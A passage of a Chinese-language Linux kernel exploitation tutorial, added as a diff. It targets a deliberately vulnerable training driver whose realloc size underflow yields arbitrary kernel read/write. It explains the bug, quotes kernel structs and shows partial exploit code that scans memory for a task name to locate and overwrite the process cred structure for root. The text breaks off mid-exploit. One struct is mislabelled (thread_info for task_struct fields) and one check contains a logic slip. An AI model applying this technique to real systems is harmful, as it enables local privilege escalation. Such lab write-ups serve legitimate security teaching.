@@ -1,0 +1,195 @@
+说明：实验所需的驱动源码、bzImage、cpio文件见[我的github](https://github.com/bsauce/kernel_exploit_series)进行下载。本教程适合对漏洞提权有一定了解的同学阅读，具体可以看看我先知之前的文章，或者[我的简书](https://www.jianshu.com/u/a12c5b882be2)。
+从任意地址读写到提权的方法，可以参考[【linux内核漏洞利用】StringIPC—从任意读写到权限提升三种方法](https://www.jianshu.com/p/07994f8b2bb0)。
+# 一、漏洞代码分析
+代码见`arbitrary.h`。
+### 1.功能函数介绍
+功能 | 输入结构名 | 输入结构 | 功能  
+---|---|---|---  
+ARBITRARY_RW_INIT | init_args | size |
+初始化全局对象，存于g_mem_buffer。kmalloc(size)空间存于*data  
+ARBITRARY_RW_REALLOC | realloc_args | grow; size; |
+grow为1则扩充，为0则缩小。`data_size`=g_mem_buffer->data_size + args->size;
+`data`=krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);  
+ARBITRARY_RW_READ | read_args | *buff; count; | copy_to_user(buff,
+g_mem_buffer->data + `pos`, count);  
+ARBITRARY_RW_SEEK | seek_args | new_pos; | `pos` = s_args->new_pos;  
+ARBITRARY_RW_WRITE | write_args | *buff; count; |
+copy_from_user(g_mem_buffer->data + `pos`, w_args->buff, count);  
+全局对象地址存于g_mem_buffer：
+    // 全局对象
+    typedef struct mem_buffer {
+      size_t data_size;
+      char *data;
+      loff_t pos;
+    }mem_buffer;
+### 2\. 漏洞分析
+    static int realloc_mem_buffer(realloc_args *args)
+        {
+            if(g_mem_buffer == NULL)
+                return -EINVAL;
+            size_t new_size;
+            char *new_data;
+            //We can overflow size here by making new_size = -1
+            if(args->grow)
+                new_size = g_mem_buffer->data_size + args->size;  
+            else
+                new_size = g_mem_buffer->data_size - args->size;
+            //new_size here will equal 0 krealloc(..., 0) = ZERO_SIZE_PTR
+            new_data = krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);
+            //missing check for return value ZERO_SIZE_PTR
+            if(new_data == NULL)
+                return -ENOMEM;
+            g_mem_buffer->data = new_data;
+            g_mem_buffer->data_size = new_size;
+            printk(KERN_INFO "[x] g_mem_buffer->data_size = %lu [x]\n", g_mem_buffer->data_size);
+            return 0;
+        }
+漏洞：`realloc_mem_buffer()`中未检查传入变量`args->size`的正负，可以传入负数。如果通过传入负数，使得`new_size==
+-1`，由于`kmalloc(new_size+1)`，由于`kmalloc(0)`会返回0x10，这样`g_mem_buffer->data ==
+0x10; g_mem_buffer->data_size == 0xffffffffffffffff`，读写时只会检查是否满足`((count +
+pos) data_size)`条件，实现任意地址读写。
+krealloc源码如下：
+    // /include/linux/slab.h
+    #define ZERO_SIZE_PTR ((void *)16)
+    // /mm/slab_common.c
+    void *krealloc(const void *p, size_t new_size, gfp_t flags)
+    {
+        void *ret;
+        if (unlikely(!new_size)) {
+            kfree(p);
+            return ZERO_SIZE_PTR;
+        }
+        ret = __do_krealloc(p, new_size, flags);
+        if (ret && kasan_reset_tag(p) != kasan_reset_tag(ret))
+            kfree(p);
+        return ret;
+    }
+    //krealloc传入0时返回0x10
+read_mem_buffer()函数如下，若满足条件`((count + pos) data_size)`，则读取内容。若`g_mem_buffer->data_size ==
+0xffffffffffffffff`，则无论读取偏移多大，都满足本条件。
+    static int read_mem_buffer(char __user *buff, size_t count)
+        {
+            if(g_mem_buffer == NULL)
+                return -EINVAL;
+            loff_t pos;
+            int ret;
+            pos = g_mem_buffer->pos;
+            if((count + pos) > g_mem_buffer->data_size)
+                return -EINVAL;
+            ret = copy_to_user(buff, g_mem_buffer->data + pos, count);
+            return ret;
+        }
+* * *
+# 二、 漏洞利用
+思路：ARBITRARY_RW_REALLOC 时，传入负数size，使得`new_size ==
+0xffffffffffffffff`，这样返回堆块地址为0x10，达到任意地址读写的目的。
+### 1\. 方法一：修改cred结构提权
+##### （1）cred结构体
+每个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体同时也包含了线程的一系列信息。
+thread_info结构体存放位于线程栈的最低地址，对应的结构体定义（\arch\x86\include\asm\thread_info.h 55）：
+    struct thread_info {
+        struct task_struct  *task;      /* main task structure */                          // 0 stopped */
+        void *stack;
+        atomic_t usage;
+        unsigned int flags; /* per process flags, defined below */
+        unsigned int ptrace;
+    ... ...
+    /* process credentials */
+        const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
+        const struct cred __rcu *real_cred; /* objective and real subjective task
+                         * credentials (COW) */
+        const struct cred __rcu *cred;  /* effective (overridable) subjective task
+                         * credentials (COW) */
+        char comm[TASK_COMM_LEN]; /* executable name excluding path
+                         - access with [gs]et_task_comm (which lock
+                           it with task_lock())
+                         - initialized normally by setup_new_exec */
+    /* file system info */
+        struct nameidata *nameidata;
+    #ifdef CONFIG_SYSVIPC
+    /* ipc stuff */
+        struct sysv_sem sysvsem;
+        struct sysv_shm sysvshm;
+    #endif
+    ... ... 
+    };
+其中，cred结构体（\include\linux\cred.h
+118）就表示该线程的权限。只要将结构体的uid~fsgid全部覆写为0即可提权该线程（root uid为0）。前28字节！！！！
+    struct cred {
+        atomic_t    usage;
+    #ifdef CONFIG_DEBUG_CREDENTIALS
+        atomic_t    subscribers;    /* number of processes subscribed */
+        void        *put_addr;
+        unsigned    magic;
+    #define CRED_MAGIC  0x43736564
+    #define CRED_MAGIC_DEAD 0x44656144
+    #endif
+        kuid_t      uid;        /* real UID of the task */
+        kgid_t      gid;        /* real GID of the task */
+        kuid_t      suid;       /* saved UID of the task */
+        kgid_t      sgid;       /* saved GID of the task */
+        kuid_t      euid;       /* effective UID of the task */
+        kgid_t      egid;       /* effective GID of the task */
+        kuid_t      fsuid;      /* UID for VFS ops */
+        kgid_t      fsgid;      /* GID for VFS ops */
+        unsigned    securebits; /* SUID-less security management */
+        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
+        kernel_cap_t    cap_permitted;  /* caps we're permitted */
+        kernel_cap_t    cap_effective;  /* caps we can actually use */
+        kernel_cap_t    cap_bset;   /* capability bounding set */
+        kernel_cap_t    cap_ambient;    /* Ambient capability set */
+    #ifdef CONFIG_KEYS
+        unsigned char   jit_keyring;    /* default keyring to attach requested
+                         * keys to */
+        struct key __rcu *session_keyring; /* keyring inherited over fork */
+        struct key  *process_keyring; /* keyring private to this process */
+        struct key  *thread_keyring; /* keyring private to this thread */
+        struct key  *request_key_auth; /* assumed request_key authority */
+    #endif
+    #ifdef CONFIG_SECURITY
+        void        *security;  /* subjective LSM security */
+    #endif
+        struct user_struct *user;   /* real user ID subscription */
+        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+        struct group_info *group_info;  /* supplementary groups for euid/fsgid */
+        struct rcu_head rcu;        /* RCU deletion hook */
+    };
+##### （2）漏洞利用
+**思路** ：利用任意读找到cred结构体，再利用任意写，将用于表示权限的数据位写0，即可提权。
+**搜索cred结构体** ：task_struct里有个`char
+comm[TASK_COMM_LEN];`结构，这个结构可通过[prctl](http://man7.org/linux/man-pages/man2/prctl.2.html)函数中的PR_SET_NAME功能，设置为一个小于16字节的字符串。
+**感慨** ：task_struct这么大，居然能找到这个结构，还能找到prctl能修改该字符串，tql。
+    PR_SET_NAME (since Linux 2.6.9)
+        设置调用线程的name，name由arg2指定，长度最多16字节，包含终止符。也可以使用pthread_setname_np(3)设置该name，用pthread_getname_np(3)获得name。
+**方法** ：设定该值作为标记，利用任意读找到该字符串，即可找到task_structure，进而找到cred结构体，再利用任意写提权。
+**确定爆破范围**
+：task_structure是通过调用kmem_cache_alloc_node()分配的，所以kmem_cache_alloc_node应该存在内核的动态分配区域。(\kernel\fork.c
+140)。[kernel内存映射](https://jin-yang.github.io/post/kernel-memory-virtual-physical-map.html)
+    static inline struct task_struct *alloc_task_struct_node(int node)
+    {
+        return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);
+    }
+根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000。
+##### （3）整合利用步骤
+完整代码见`exp_cred.c`。
+    //  爆破出 cred地址
+        i_args.size=0x100;
+        ioctl(fd, ARBITRARY_RW_INIT, &i_args);
+        rello_args.grow=0;
+        rello_args.size=0x100+1;
+        ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
+        puts("[+] We can read and write any memory! [+]");
+        for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
+        {
+            read_mem(fd,addr,buf,0x1000);
+            result=memmem(buf,0x1000,target,16);
+            if (result)
+            {
+                printf("[+] Find try2findmesauce at : %p\n",result);
+                cred=*(size_t *)(result-0x8);
+                real_cred=*(size_t *)(result-0x10);
+                if ((cred || 0xff00000000000000) && (real_cred == cred))
+                {
+                    target_addr=addr+result-(long int)(buf);
+                    printf("[+] found task_struct 0x%x\n",target_addr);
+                    printf("[+] found cred 0x%lx\n",real_cred);
